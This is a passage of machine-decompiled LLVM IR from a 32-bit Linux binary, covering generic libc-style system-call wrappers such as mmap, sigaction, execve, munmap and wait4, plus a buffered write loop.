  %v1_80510cd = add i32 %arg3, 4
  %v3_80510d1 = inttoptr i32 %v1_80510cd to i16*
  %v4_80510d1 = call i32 @function_804f1b0(i16* %v3_80510d1, i32 %v2_80510c8, i32 128)
  %v2_80510da = add i32 %arg3, 132
  %v3_80510da = inttoptr i32 %v2_80510da to i32*
  %v2_80510e7 = add i32 %arg3, 136
  %v3_80510e7 = inttoptr i32 %v2_80510e7 to i32*
  %v0_80510ed.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80510ed

dec_label_pc_80510ed:                             ; preds = %dec_label_pc_8051088, %dec_label_pc_80510bc
  %v0_80510ed = phi i32 [ %v5_80510aa, %dec_label_pc_8051088 ], [ %v0_80510ed.pre, %dec_label_pc_80510bc ]
  store i32 %v0_8051020, i32* @ebx, align 4
  store i32 %v0_805101f, i32* @esi, align 4
  ret i32 %v0_80510ed

; uselistorder directives
  uselistorder i32 128, { 1, 2, 4, 0, 3, 5 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_80510ed, { 1, 0 }
  uselistorder label %dec_label_pc_8051088, { 1, 0 }
}

define i32 @function_80510f8() local_unnamed_addr {
dec_label_pc_80510f8:
  %v0_80510fb = load i32, i32* @eax, align 4
  %v1_80510fd = sub i32 0, %v0_80510fb
  %v1_80510ff = call i32 @function_804e1ec(i32 ptrtoint (i32* @0 to i32))
  %v2_8051104 = inttoptr i32 %v1_80510ff to i32*
  store i32 %v1_80510fd, i32* %v2_8051104, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 2, 3, 4, 1, 5, 6, 7, 8, 9, 12, 13, 10, 11, 14, 15 }
}

define i32 @function_8051110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051110:
  %stack_var_4 = alloca i32, align 4
  %v0_8051110 = load i32, i32* @ebx, align 4
  %v2_805111b = load i32, i32* @ecx, align 4
  %v4_805111b = load i32, i32* @esi, align 4
  %v5_805111b = load i32, i32* @edi, align 4
  %v6_805111b = load i32, i32* @ebp, align 4
  %v7_805111b = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_805111b, i32 %v0_8051110, i32 %v4_805111b, i32 %v5_805111b, i32 %v6_805111b)
  %v8_805111b = ptrtoint i32* %v7_805111b to i32
  store i32 %v0_8051110, i32* @ebx, align 4
  %v3_8051124 = icmp ugt i32* %v7_805111b, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8051124, i32 134549752)
  ret i32 %v8_805111b

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134549752, { 1, 0 }
  uselistorder i32* @ebp, { 1, 2, 3, 6, 4, 5, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 35, 31, 32, 33, 34, 0, 36, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* @ecx, { 3, 38, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32, 33, 1, 34, 37, 4, 35, 36, 5, 6, 7, 8, 9, 10, 2, 39 }
}

define i32 @function_805112c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805112c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805112c = load i32, i32* @ebx, align 4
  store i32 %v0_805112c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805113f = call i32 @int80_syscall(i32 102)
  store i32 %v1_805113f, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805113f, -4095
  br i1 %tmp9, label %dec_label_pc_8051158, label %dec_label_pc_805114c

dec_label_pc_805114c:                             ; preds = %dec_label_pc_805112c
  %v1_805114c = call i32 @function_804e1ec(i32 %v0_805112c)
  %v0_8051151 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051151 = sub i32 0, %v0_8051151
  %v2_8051153 = inttoptr i32 %v1_805114c to i32*
  store i32 %v1_8051151, i32* %v2_8051153, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805115c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051158

dec_label_pc_8051158:                             ; preds = %dec_label_pc_805112c, %dec_label_pc_805114c
  %v2_805115c = phi i32 [ %v0_805112c, %dec_label_pc_805112c ], [ %v2_805115c.pre, %dec_label_pc_805114c ]
  %v0_8051158 = phi i32 [ %v1_805113f, %dec_label_pc_805112c ], [ -1, %dec_label_pc_805114c ]
  %v2_805115a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805115a, i32* @edx, align 4
  store i32 %v2_805115c, i32* @ebx, align 4
  ret i32 %v0_8051158

; uselistorder directives
  uselistorder i32 %v1_805113f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051158, { 1, 0 }
}

define i32 @function_8051160(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051160:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051161 = load i32, i32* @esi, align 4
  store i32 %v0_8051161, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051175 = load i32, i32* @ebx, align 4
  %v7_805117d = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805117d, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_805117d, -4095
  br i1 %tmp14, label %dec_label_pc_8051195, label %dec_label_pc_8051189

dec_label_pc_8051189:                             ; preds = %dec_label_pc_8051160
  %v1_8051189 = call i32 @function_804e1ec(i32 %v0_8051175)
  %v0_805118e = load i32, i32* %esi.global-to-local, align 4
  %v1_805118e = sub i32 0, %v0_805118e
  %v2_8051190 = inttoptr i32 %v1_8051189 to i32*
  store i32 %v1_805118e, i32* %v2_8051190, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051198.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051195

dec_label_pc_8051195:                             ; preds = %dec_label_pc_8051160, %dec_label_pc_8051189
  %v2_8051198 = phi i32 [ %v0_8051161, %dec_label_pc_8051160 ], [ %v2_8051198.pre, %dec_label_pc_8051189 ]
  %v0_8051195 = phi i32 [ %v7_805117d, %dec_label_pc_8051160 ], [ -1, %dec_label_pc_8051189 ]
  store i32 %v2_8051198, i32* @esi, align 4
  ret i32 %v0_8051195

; uselistorder directives
  uselistorder i32 %v7_805117d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051195, { 1, 0 }
}

define i32 @function_805119c(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805119c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805119c = load i32, i32* @ebx, align 4
  store i32 %v0_805119c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80511af = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80511af, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_80511af, -4095
  br i1 %tmp10, label %dec_label_pc_80511c8, label %dec_label_pc_80511bc

dec_label_pc_80511bc:                             ; preds = %dec_label_pc_805119c
  %v1_80511bc = call i32 @function_804e1ec(i32 %v0_805119c)
  %v0_80511c1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80511c1 = sub i32 0, %v0_80511c1
  %v2_80511c3 = inttoptr i32 %v1_80511bc to i32*
  store i32 %v1_80511c1, i32* %v2_80511c3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80511cc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80511c8

dec_label_pc_80511c8:                             ; preds = %dec_label_pc_805119c, %dec_label_pc_80511bc
  %v2_80511cc = phi i32 [ %v0_805119c, %dec_label_pc_805119c ], [ %v2_80511cc.pre, %dec_label_pc_80511bc ]
  %v0_80511c8 = phi i32 [ %v4_80511af, %dec_label_pc_805119c ], [ -1, %dec_label_pc_80511bc ]
  store i32 %v2_80511cc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80511c8

; uselistorder directives
  uselistorder i32 %v4_80511af, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80511c8, { 1, 0 }
}

define i32 @function_80511d0(i8* %arg1) local_unnamed_addr {
dec_label_pc_80511d0:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp6 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_80511d0 = load i32, i32* @edi, align 4
  store i32 %v0_80511d0, i32* %stack_var_-4, align 4
  %v4_80511d4 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80511d4, i32* %edi.global-to-local, align 4
  %v0_80511e0 = load i32, i32* @ebx, align 4
  %v5_80511e8 = insertvalue [1 x i8*] undef, i8* %tmp6, 0
  %v8_80511e8 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80511e8 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80511e8, [1 x i8*] %v8_80511e8)
  store i32 %v9_80511e8, i32* %edi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v9_80511e8, -4095
  br i1 %tmp14, label %dec_label_pc_8051200, label %dec_label_pc_80511f4

dec_label_pc_80511f4:                             ; preds = %dec_label_pc_80511d0
  %v1_80511f4 = call i32 @function_804e1ec(i32 %v0_80511e0)
  %v0_80511f9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80511f9 = sub i32 0, %v0_80511f9
  %v2_80511fb = inttoptr i32 %v1_80511f4 to i32*
  store i32 %v1_80511f9, i32* %v2_80511fb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051204.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051200

dec_label_pc_8051200:                             ; preds = %dec_label_pc_80511d0, %dec_label_pc_80511f4
  %v2_8051204 = phi i32 [ %v0_80511d0, %dec_label_pc_80511d0 ], [ %v2_8051204.pre, %dec_label_pc_80511f4 ]
  %v0_8051200 = phi i32 [ %v9_80511e8, %dec_label_pc_80511d0 ], [ -1, %dec_label_pc_80511f4 ]
  store i32 %v2_8051204, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051200

; uselistorder directives
  uselistorder i32 %v9_80511e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051200, { 1, 0 }
}

define i32 @function_8051208() local_unnamed_addr {
dec_label_pc_8051208:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051208 = load i32, i32* @ebx, align 4
  store i32 %v0_8051208, i32* %stack_var_-4, align 4
  %v1_8051211 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051211, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051211, -4095
  br i1 %tmp7, label %dec_label_pc_8051228, label %dec_label_pc_805121c

dec_label_pc_805121c:                             ; preds = %dec_label_pc_8051208
  %v1_805121c = call i32 @function_804e1ec(i32 %v0_8051208)
  %v0_8051221 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051221 = sub i32 0, %v0_8051221
  %v2_8051223 = inttoptr i32 %v1_805121c to i32*
  store i32 %v1_8051221, i32* %v2_8051223, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805122c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051228

dec_label_pc_8051228:                             ; preds = %dec_label_pc_8051208, %dec_label_pc_805121c
  %v2_805122c = phi i32 [ %v0_8051208, %dec_label_pc_8051208 ], [ %v2_805122c.pre, %dec_label_pc_805121c ]
  %v0_8051228 = phi i32 [ %v1_8051211, %dec_label_pc_8051208 ], [ -1, %dec_label_pc_805121c ]
  store i32 %v2_805122c, i32* @ebx, align 4
  ret i32 %v0_8051228

; uselistorder directives
  uselistorder i32 %v1_8051211, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051228, { 1, 0 }
}

define i32 @function_8051230() local_unnamed_addr {
dec_label_pc_8051230:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051230 = load i32, i32* @ebx, align 4
  store i32 %v0_8051230, i32* %stack_var_-4, align 4
  %v1_8051239 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051239, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051239, -4095
  br i1 %tmp7, label %dec_label_pc_8051250, label %dec_label_pc_8051244

dec_label_pc_8051244:                             ; preds = %dec_label_pc_8051230
  %v1_8051244 = call i32 @function_804e1ec(i32 %v0_8051230)
  %v0_8051249 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051249 = sub i32 0, %v0_8051249
  %v2_805124b = inttoptr i32 %v1_8051244 to i32*
  store i32 %v1_8051249, i32* %v2_805124b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051254.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051250

dec_label_pc_8051250:                             ; preds = %dec_label_pc_8051230, %dec_label_pc_8051244
  %v2_8051254 = phi i32 [ %v0_8051230, %dec_label_pc_8051230 ], [ %v2_8051254.pre, %dec_label_pc_8051244 ]
  %v0_8051250 = phi i32 [ %v1_8051239, %dec_label_pc_8051230 ], [ -1, %dec_label_pc_8051244 ]
  store i32 %v2_8051254, i32* @ebx, align 4
  ret i32 %v0_8051250

; uselistorder directives
  uselistorder i32 %v1_8051239, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051250, { 1, 0 }
}

define i32 @function_8051258() local_unnamed_addr {
dec_label_pc_8051258:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051258 = load i32, i32* @ebx, align 4
  store i32 %v0_8051258, i32* %stack_var_-4, align 4
  %v1_8051261 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051261, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051261, -4095
  br i1 %tmp7, label %dec_label_pc_8051278, label %dec_label_pc_805126c

dec_label_pc_805126c:                             ; preds = %dec_label_pc_8051258
  %v1_805126c = call i32 @function_804e1ec(i32 %v0_8051258)
  %v0_8051271 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051271 = sub i32 0, %v0_8051271
  %v2_8051273 = inttoptr i32 %v1_805126c to i32*
  store i32 %v1_8051271, i32* %v2_8051273, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805127c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051278

dec_label_pc_8051278:                             ; preds = %dec_label_pc_8051258, %dec_label_pc_805126c
  %v2_805127c = phi i32 [ %v0_8051258, %dec_label_pc_8051258 ], [ %v2_805127c.pre, %dec_label_pc_805126c ]
  %v0_8051278 = phi i32 [ %v1_8051261, %dec_label_pc_8051258 ], [ -1, %dec_label_pc_805126c ]
  store i32 %v2_805127c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051278

; uselistorder directives
  uselistorder i32 %v1_8051261, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051278, { 1, 0 }
}

define i32 @function_8051280() local_unnamed_addr {
dec_label_pc_8051280:
  %v0_8051280 = load i32, i32* @global_var_805b484.94, align 4
  %v1_805128a = icmp eq i32 %v0_8051280, 0
  %.v0_8051280 = select i1 %v1_805128a, i32 4096, i32 %v0_8051280
  ret i32 %.v0_8051280

; uselistorder directives
  uselistorder i32 4096, { 3, 10, 11, 4, 8, 5, 1, 9, 6, 2, 0, 7 }
}

define i32 @function_8051294() local_unnamed_addr {
dec_label_pc_8051294:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051294 = load i32, i32* @ebx, align 4
  store i32 %v0_8051294, i32* %stack_var_-4, align 4
  %v1_805129d = call i32 @int80_syscall(i32 199)
  store i32 %v1_805129d, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805129d, -4095
  br i1 %tmp7, label %dec_label_pc_80512b4, label %dec_label_pc_80512a8

dec_label_pc_80512a8:                             ; preds = %dec_label_pc_8051294
  %v1_80512a8 = call i32 @function_804e1ec(i32 %v0_8051294)
  %v0_80512ad = load i32, i32* %ebx.global-to-local, align 4
  %v1_80512ad = sub i32 0, %v0_80512ad
  %v2_80512af = inttoptr i32 %v1_80512a8 to i32*
  store i32 %v1_80512ad, i32* %v2_80512af, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80512b8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80512b4

dec_label_pc_80512b4:                             ; preds = %dec_label_pc_8051294, %dec_label_pc_80512a8
  %v2_80512b8 = phi i32 [ %v0_8051294, %dec_label_pc_8051294 ], [ %v2_80512b8.pre, %dec_label_pc_80512a8 ]
  %v0_80512b4 = phi i32 [ %v1_805129d, %dec_label_pc_8051294 ], [ -1, %dec_label_pc_80512a8 ]
  store i32 %v2_80512b8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80512b4

; uselistorder directives
  uselistorder i32 %v1_805129d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80512b4, { 1, 0 }
}

define i32 @function_80512bc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80512bc:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80512bc = load i32, i32* @ebx, align 4
  store i32 %v0_80512bc, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_80512cf = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_80512cf, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_80512cf, -4095
  br i1 %tmp10, label %dec_label_pc_80512e8, label %dec_label_pc_80512dc

dec_label_pc_80512dc:                             ; preds = %dec_label_pc_80512bc
  %v1_80512dc = call i32 @function_804e1ec(i32 %v0_80512bc)
  %v0_80512e1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80512e1 = sub i32 0, %v0_80512e1
  %v2_80512e3 = inttoptr i32 %v1_80512dc to i32*
  store i32 %v1_80512e1, i32* %v2_80512e3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80512ec.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80512e8

dec_label_pc_80512e8:                             ; preds = %dec_label_pc_80512bc, %dec_label_pc_80512dc
  %v2_80512ec = phi i32 [ %v0_80512bc, %dec_label_pc_80512bc ], [ %v2_80512ec.pre, %dec_label_pc_80512dc ]
  %v0_80512e8 = phi i32 [ %v3_80512cf, %dec_label_pc_80512bc ], [ -1, %dec_label_pc_80512dc ]
  store i32 %v2_80512ec, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80512e8

; uselistorder directives
  uselistorder i32 %v3_80512cf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80512e8, { 1, 0 }
}

define i32 @function_8051324(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051324:
  %v0_8051325 = load i32, i32* @ebx, align 4
  %v0_8051329 = load i32, i32* @global_var_805b49c.100, align 4
  %v1_8051329 = icmp eq i32 %v0_8051329, 0
  %v1_8051334 = icmp eq i1 %v1_8051329, false
  br i1 %v1_8051334, label %dec_label_pc_8051347, label %dec_label_pc_8051336

dec_label_pc_8051336:                             ; preds = %dec_label_pc_8051324
  %v1_805133b = call i32 @function_8052018(i32 0)
  %v2_8051343 = icmp slt i32 %v1_805133b, 0
  br i1 %v2_8051343, label %dec_label_pc_8051369, label %dec_label_pc_8051336.dec_label_pc_8051347_crit_edge

dec_label_pc_8051336.dec_label_pc_8051347_crit_edge: ; preds = %dec_label_pc_8051336
  %v0_8051349.pre = load i32, i32* @global_var_805b49c.100, align 4
  br label %dec_label_pc_8051347

dec_label_pc_8051347:                             ; preds = %dec_label_pc_8051336.dec_label_pc_8051347_crit_edge, %dec_label_pc_8051324
  %v0_8051357 = phi i32 [ %v0_8051349.pre, %dec_label_pc_8051336.dec_label_pc_8051347_crit_edge ], [ %v0_8051329, %dec_label_pc_8051324 ]
  %v1_8051347 = icmp eq i32 %arg1, 0
  %v1_805134e = icmp eq i1 %v1_8051347, false
  store i32 %v0_8051357, i32* @ebx, align 4
  br i1 %v1_805134e, label %dec_label_pc_8051354, label %dec_label_pc_805136c

dec_label_pc_8051354:                             ; preds = %dec_label_pc_8051347
  %v2_8051359 = add i32 %v0_8051357, %arg1
  %v1_805135d = call i32 @function_8052018(i32 %v2_8051359)
  %v2_8051365 = icmp slt i32 %v1_805135d, 0
  %v1_8051367 = icmp eq i1 %v2_8051365, false
  br i1 %v1_8051367, label %dec_label_pc_8051354.dec_label_pc_805136c_crit_edge, label %dec_label_pc_8051369

dec_label_pc_8051354.dec_label_pc_805136c_crit_edge: ; preds = %dec_label_pc_8051354
  %v0_805136c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805136c

dec_label_pc_8051369:                             ; preds = %dec_label_pc_8051354, %dec_label_pc_8051336
  br label %dec_label_pc_805136c

dec_label_pc_805136c:                             ; preds = %dec_label_pc_8051347, %dec_label_pc_8051354.dec_label_pc_805136c_crit_edge, %dec_label_pc_8051369
  %v0_805136c = phi i32 [ %v0_805136c.pre, %dec_label_pc_8051354.dec_label_pc_805136c_crit_edge ], [ -1, %dec_label_pc_8051369 ], [ %v0_8051357, %dec_label_pc_8051347 ]
  store i32 %v0_8051325, i32* @ebx, align 4
  ret i32 %v0_805136c

; uselistorder directives
  uselistorder i32 %v0_8051357, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8052018, { 1, 0 }
  uselistorder label %dec_label_pc_805136c, { 2, 1, 0 }
}

define i32 @function_8051374(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4) local_unnamed_addr {
dec_label_pc_8051374:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051375 = load i32, i32* @esi, align 4
  store i32 %v0_8051375, i32* %stack_var_-8, align 4
  %v4_8051385 = ptrtoint %rusage* %arg4 to i32
  store i32 %v4_8051385, i32* %esi.global-to-local, align 4
  %v0_8051389 = load i32, i32* @ebx, align 4
  %v6_8051391 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4)
  store i32 %v0_8051389, i32* @ebx, align 4
  store i32 %v6_8051391, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v6_8051391, -4095
  br i1 %tmp12, label %dec_label_pc_80513a9, label %dec_label_pc_805139d

dec_label_pc_805139d:                             ; preds = %dec_label_pc_8051374
  %v1_805139d = call i32 @function_804e1ec(i32 %v0_8051389)
  %v0_80513a2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80513a2 = sub i32 0, %v0_80513a2
  %v2_80513a4 = inttoptr i32 %v1_805139d to i32*
  store i32 %v1_80513a2, i32* %v2_80513a4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80513ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80513a9

dec_label_pc_80513a9:                             ; preds = %dec_label_pc_8051374, %dec_label_pc_805139d
  %v2_80513ac = phi i32 [ %v0_8051375, %dec_label_pc_8051374 ], [ %v2_80513ac.pre, %dec_label_pc_805139d ]
  %v0_80513a9 = phi i32 [ %v6_8051391, %dec_label_pc_8051374 ], [ -1, %dec_label_pc_805139d ]
  store i32 %v2_80513ac, i32* @esi, align 4
  ret i32 %v0_80513a9

; uselistorder directives
  uselistorder i32 %v6_8051391, { 1, 0, 2 }
  uselistorder i32 %v0_8051389, { 1, 0 }
  uselistorder label %dec_label_pc_80513a9, { 1, 0 }
}

define i32 @function_805149c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805149c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_805149d = load i32, i32* @edi, align 4
  %v0_805149f = load i32, i32* @ebx, align 4
  %v4_80514a3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80514a3, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80514af3 = icmp eq i32 %arg3, 0
  br i1 %v1_80514af3, label %dec_label_pc_805150e, label %dec_label_pc_80514b4.lr.ph

dec_label_pc_80514b4.lr.ph:                       ; preds = %dec_label_pc_805149c
  br label %dec_label_pc_80514b4

dec_label_pc_80514b4:                             ; preds = %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge, %dec_label_pc_80514b4.lr.ph
  %v0_80514c4 = phi i32 [ %v4_80514a3, %dec_label_pc_80514b4.lr.ph ], [ %v0_80514c4.pre, %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge ]
  %v0_80514c3 = phi i32 [ %arg2, %dec_label_pc_80514b4.lr.ph ], [ %v2_80514d5, %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge ]
  %v0_80514b6.in = phi i32 [ %arg3, %dec_label_pc_80514b4.lr.ph ], [ %v2_80514d3, %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge ]
  %v0_80514b6 = icmp slt i32 %v0_80514b6.in, 0
  store i32 %v0_80514b6.in, i32* %ebp.global-to-local, align 4
  %v2_80514b6 = icmp eq i1 %v0_80514b6, false
  %storemerge = select i1 %v2_80514b6, i32 %v0_80514b6.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80514c4 = add i32 %v0_80514c4, 4
  %v2_80514c4 = inttoptr i32 %v1_80514c4 to i32*
  %v3_80514c4 = load i32, i32* %v2_80514c4, align 4
  %tmp30 = inttoptr i32 %v0_80514c3 to i32*
  %v5_80514c7 = call i32 @function_804e180(i32 %v3_80514c4, i32* %tmp30, i32 %storemerge)
  store i32 %v5_80514c7, i32* %eax.global-to-local, align 4
  %v2_80514cf = icmp slt i32 %v5_80514c7, 0
  br i1 %v2_80514cf, label %dec_label_pc_80514d9, label %dec_label_pc_80514d3

dec_label_pc_80514d3:                             ; preds = %dec_label_pc_80514b4
  %v0_80514d3 = load i32, i32* @ebx, align 4
  %v2_80514d3 = sub i32 %v0_80514d3, %v5_80514c7
  %v12_80514d3 = icmp eq i32 %v2_80514d3, 0
  store i32 %v2_80514d3, i32* @ebx, align 4
  %v0_80514d5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80514d5 = add i32 %v0_80514d5, %v5_80514c7
  store i32 %v2_80514d5, i32* %esi.global-to-local, align 4
  br i1 %v12_80514d3, label %dec_label_pc_805150e, label %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge

dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge: ; preds = %dec_label_pc_80514d3
  %v0_80514c4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80514b4

dec_label_pc_80514d9:                             ; preds = %dec_label_pc_80514b4
  %v0_80514d9 = load i32, i32* @edi, align 4
  %v1_80514d9 = add i32 %v0_80514d9, 8
  %v2_80514d9 = inttoptr i32 %v1_80514d9 to i32*
  %v3_80514d9 = load i32, i32* %v2_80514d9, align 4
  store i32 %v3_80514d9, i32* %edx.global-to-local, align 4
  %v1_80514dc = add i32 %v0_80514d9, 12
  %v2_80514dc = inttoptr i32 %v1_80514dc to i32*
  %v3_80514dc = load i32, i32* %v2_80514dc, align 4
  store i32 %v3_80514dc, i32* %eax.global-to-local, align 4
  %v1_80514df = inttoptr i32 %v0_80514d9 to i16*
  %v2_80514df = load i16, i16* %v1_80514df, align 2
  %v3_80514df = or i16 %v2_80514df, 8
  store i16 %v3_80514df, i16* %v1_80514df, align 2
  %v0_80514e3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80514e3 = load i32, i32* %edx.global-to-local, align 4
  %v2_80514e3 = sub i32 %v0_80514e3, %v1_80514e3
  %v12_80514e3 = icmp eq i32 %v2_80514e3, 0
  store i32 %v2_80514e3, i32* %eax.global-to-local, align 4
  %v4_805150a.pre = load i32, i32* @ebx, align 4
  br i1 %v12_80514e3, label %dec_label_pc_805150a, label %dec_label_pc_80514e7

dec_label_pc_80514e7:                             ; preds = %dec_label_pc_80514d9
  %v6_80514e9 = icmp ugt i32 %v2_80514e3, %v4_805150a.pre
  br i1 %v6_80514e9, label %dec_label_pc_80514ed.preheader, label %dec_label_pc_80514eb

dec_label_pc_80514eb:                             ; preds = %dec_label_pc_80514e7
  store i32 %v2_80514e3, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80514ed.preheader

dec_label_pc_80514ed.preheader:                   ; preds = %dec_label_pc_80514eb, %dec_label_pc_80514e7
  %v0_80514ed.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80514ed

dec_label_pc_80514ed:                             ; preds = %dec_label_pc_80514ed.preheader, %dec_label_pc_80514ff
